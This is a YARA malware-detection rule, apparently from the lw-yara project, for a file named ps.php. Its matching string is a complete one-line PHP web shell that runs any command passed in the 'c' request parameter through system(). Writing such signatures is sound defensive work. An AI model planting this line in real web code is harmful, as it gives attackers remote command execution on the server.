rule case138_ps {
  meta:
    description = "case138 - file ps.php"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara"
    date        = "2018-06-23"
    hash1       = "91d3afaf598c91de9fca8de1fe6ecbc55f840d4d485e2cb69479af07a473edc1"

  strings:
    $s1 = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }" fullword ascii

  condition:
    (uint16(0) == 0x3f3c and
      filesize < 1KB and
      (all of them)
    ) or (all of them)
}